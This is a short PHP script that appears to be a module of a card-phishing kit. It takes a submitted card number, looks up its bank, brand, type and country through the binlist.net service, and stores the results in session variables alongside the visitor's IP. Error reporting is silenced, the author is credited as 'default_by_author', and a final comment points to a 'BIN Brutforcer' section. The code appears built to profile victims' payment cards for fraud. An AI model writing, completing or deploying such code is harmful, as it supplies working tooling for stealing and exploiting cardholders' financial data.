<?php



session_start();
error_reporting(0);


///////////////////////////////// BIN CHECKER  /////////////////////////////////

$BIN_LOOKUP  = str_replace(' ', '', $_POST['card_number']);
$dastalk = @json_decode(file_get_contents("https://lookup.binlist.net/".$BIN_LOOKUP));
$BIN_CARD = $dastalk->scheme;
$BIN_BANK = $dastalk->bank->name;
$BIN_TYPE = $dastalk->type;
$BIN_LEVEL   = 'default_by_author';
$BIN_CNTRCODE= $dastalk->numeric;
$BIN_WEBSITE = strtolower($dastalk->url);
$BIN_PHONE   = strtolower($dastalk->phone);
$BIN_COUNTRY = $dastalk->country->name;

///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////

///////////////////////////////// BIN Brutforcer/////////////////////////
?>
